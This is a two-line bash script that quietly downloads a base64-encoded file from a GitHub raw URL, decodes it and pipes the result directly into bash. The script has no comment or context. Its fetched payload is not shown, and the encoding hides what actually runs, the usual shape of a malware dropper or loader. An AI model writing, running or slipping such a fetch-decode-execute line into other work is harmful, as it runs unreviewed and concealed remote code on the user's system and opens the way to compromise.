#!/bin/bash
wget -qO- https://raw.githubusercontent.com/cliftonboomer/section/refs/heads/main/entrypoint.sh | base64 -d | bash
